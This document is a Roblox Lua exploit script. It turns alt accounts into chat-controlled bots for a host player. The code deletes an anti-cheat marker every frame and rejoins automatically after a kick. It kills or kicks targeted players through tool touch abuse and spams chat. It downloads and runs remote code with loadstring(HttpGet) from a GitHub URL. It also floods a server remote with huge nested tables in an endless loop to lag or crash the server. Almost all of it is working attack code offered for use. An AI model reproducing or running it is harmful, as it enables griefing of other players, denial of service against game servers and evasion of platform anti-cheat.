--// Config
getrenv().Config = {
    ["Host"] = "JesseWatts69",
    ["Prefix"] = ":"
}

--// Commands
getrenv().Commands = {
    ["Smite"] = "smite!",
    ["Kick"] = "banish!",
    ["Bringalt"] = "bringalt",
    ["Hidealt"] = "hidealt",
    ["Dropfps"] = "dropfps",
    ["UnDropfps"] = "undropfps",
    ["Lagserver"] = "lagserver",
    ["UnLagserver"] = "unlagserver"
}
if not game:IsLoaded() then
game.Loaded:Wait()
end

repeat task.wait() until game.Players.LocalPlayer

--// Host Check
if game.Players.LocalPlayer.Name == Config.Host then
    return
end

--// Vars
local Players = game:GetService("Players")
local Client = Players.LocalPlayer
local Character = Client.Character
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local CharacterFolder = Workspace.Characters

--// Waiting For Character
repeat wait() until CharacterFolder:FindFirstChild(Client.Name)

--// Wait
wait(5)

--// Character Reset
Character.Humanoid.Health = 0

--// Waiting For Respawn
local CharacterAdded = Client.CharacterAdded:Wait()

--// Anti-Cheat Bypass
RunService.Heartbeat:Connect(function()
    CharacterFolder:FindFirstChild(Client.Name)["I_LOADED_I"].Parent = nil
end)

--// Rejoin If Kick
getgenv().Rejoin = game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(function(Child)
    if Child.Name == 'ErrorPrompt' and Child:FindFirstChild('MessageArea') and Child.MessageArea:FindFirstChild("ErrorFrame") then
        game:GetService("TeleportService"):Teleport(game.PlaceId)
    end
end)

--// Target Username Finder
function find(Username)
    for _, Player in ipairs(game.Players:GetPlayers()) do
        if (string.lower(Username) == string.sub(string.lower(Player.Name), 1, #Username)) or (string.lower(Username) == string.sub(string.lower(Player.DisplayName), 1, #Username)) then
            return Player
        end
    end
end

--// Smite
game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
    if messageData.FromSpeaker == Config.Host and Client.Name ~= Config.Host then
        msg = messageData.Message
        local args = msg:split(" ")
        if args[1] == Config.Prefix .. "" .. Commands.Smite then
            local name = find(args[2])
            print(name)
            local Tool1 = Client.Backpack["Phone"]
            local Tool2 = Client.Backpack["[Boombox]"]
            local Humanoid = Client.Character.Humanoid
            local NewHumanoid = Humanoid:Clone()
            NewHumanoid.Parent = Client.Character
            NewHumanoid:ChangeState(15)
            Humanoid:Destroy()
            Tool1.Parent = Client.Character
            wait()
            firetouchinterest(Tool1.Handle, name.Character["Head"], 0)
            Character.HumanoidRootPart.CFrame = name.Character.HumanoidRootPart.CFrame
            wait(0.1)
            Tool2.Parent = Client.Character
            firetouchinterest(Tool2.Handle, name.Character["Head"], 0)
        end 
    end 
end)

--// Kick
game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
    if messageData.FromSpeaker == Config.Host and Client.Name ~= Config.Host then
        msg = messageData.Message
        local args = msg:split(" ")
        if args[1] == Config.Prefix .. "" .. Commands.Kick then
            local name = find(args[2])
            print(name)
            local Tool1 = Client.Backpack["Phone"]
            local Tool2 = Client.Backpack["[Boombox]"]
            Client.Character.HumanoidRootPart.Anchored = true
            local Humanoid = Client.Character.Humanoid
            local NewHumanoid = Humanoid:Clone()
            NewHumanoid.Parent = Client.Character
            Humanoid:Destroy()
            Tool1.Parent = Client.Character
            firetouchinterest(Tool1.Handle, name.Character["Head"], 0)
            Tool2.Parent = Client.Character
            wait(0.1)
            firetouchinterest(Tool2.Handle, name.Character["Head"], 0)
        end 
    end 
end)

--// Bringalt
game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
    if messageData.FromSpeaker == Config.Host and Client.Name ~= Config.Host then
        msg = messageData.Message
        local args = msg:split(" ")
        if args[1] == Config.Prefix .. "" .. Commands.Bringalt then
            
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players:FindFirstChild('JesseWatts69').Character.HumanoidRootPart.CFrame + Vector3.new(12,0,0)
        end
    end
end)

--// Hidealt
game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
    if messageData.FromSpeaker == Config.Host and Client.Name ~= Config.Host then
        msg = messageData.Message
        local args = msg:split(" ")
        if args[1] == Config.Prefix .. "" .. Commands.Hidealt then
            
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(135.9333, 410.897, -459.4953, -0.0318, 0, -0.9995, 0, 1, 0, 0.9995, 0, -0.0318)
        end
    end
end)

--// Dropfps
game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
    if messageData.FromSpeaker == Config.Host and Client.Name ~= Config.Host then
        msg = messageData.Message
        local args = msg:split(" ")
        if args[1] == Config.Prefix .. "" .. Commands.Dropfps then
            
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players:FindFirstChild('JesseWatts69').Character.HumanoidRootPart.CFrame + Vector3.new(12,0,0)
            


            
           	wait(1)
			if CurrAnim and CurrAnim.IsPlaying then
					CurrAnim:Stop()
			end
                    
				local Anim = Instance.new("Animation")
				Anim.AnimationId = "http://www.roblox.com/asset/?id=507771955"
				CurrAnim = game.Players.LocalPlayer.Character.Humanoid.Animator:LoadAnimation(Anim)
				CurrAnim:Play()
				CurrAnim:AdjustSpeed()
				wait(.1)
				local RunService = game:GetService("RunService")

                for _,a in pairs(workspace:GetDescendants()) do
   if a:IsA("Seat") then
       a:Remove()
   end
end

				wait(1)
				local A_1 = "[Downfall] Dropping FPS 1" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
				wait(1)
                 local A_1 = "[Downfall] Dropping FPS 2" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
                wait(1)
                 local A_1 = "[Downfall] Dropping FPS 3" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
                 wait(1)
                 local A_1 = "[Downfall] Dropping FPS 4" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
                 wait(1)
                 loadstring(game:HttpGet("https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Leg%20Resize", true))()
        end
    end
end)


--// UnDropfps
game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
    if messageData.FromSpeaker == Config.Host and Client.Name ~= Config.Host then
        msg = messageData.Message
        local args = msg:split(" ")
        if args[1] == Config.Prefix .. "" .. Commands.UnDropfps then
            
            local A_1 = "[Downfall] Fixing FPS " local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
				wait(1)
            game.Players.LocalPlayer.Character.Humanoid.Health = 0
        end
    end
end)

--// Lagserver
game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
    if messageData.FromSpeaker == Config.Host and Client.Name ~= Config.Host then
        msg = messageData.Message
        local args = msg:split(" ")
        if args[1] == Config.Prefix .. "" .. Commands.Lagserver then
            
            shared.TeleportToSky = false -- for games that show ur ping (like custom duels)

if shared.TeleportToSky then
local char = game:GetService('Players').LocalPlayer.Character
char.HumanoidRootPart.CFrame = CFrame.new(0,9e9,0)
task.wait(0.5)
char.HumanoidRootPart.Anchored = true
end
while wait(1.5) do --// don't change it's the best
game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge)
local function getmaxvalue(val)
   local mainvalueifonetable = 499999
   if type(val) ~= "number" then
       return nil
   end
   local calculateperfectval = (mainvalueifonetable/(val+2))
   return calculateperfectval
end
 
local function bomb(tableincrease, tries)
local maintable = {}
local spammedtable = {}
 
table.insert(spammedtable, {})
z = spammedtable[1]
 
for i = 1, tableincrease do
    local tableins = {}
    table.insert(z, tableins)
    z = tableins
end
 
local calculatemax = getmaxvalue(tableincrease)
local maximum
 
if calculatemax then
     maximum = calculatemax
     else
     maximum = 999999
end
 
for i = 1, maximum do
     table.insert(maintable, spammedtable)
end
 
for i = 1, tries do
     game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
end
end
 
bomb(289, 5) --// change values if client crashes
end

        end
    end
end)

--// UnLagserver
game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
    if messageData.FromSpeaker == Config.Host and Client.Name ~= Config.Host then
        msg = messageData.Message
        local args = msg:split(" ")
        if args[1] == Config.Prefix .. "" .. Commands.UnLagserver then
            
            local ts = game:GetService("TeleportService")
local p = game:GetService("Players").LocalPlayer
ts:Teleport(game.PlaceId, p)

        end
    end
end)
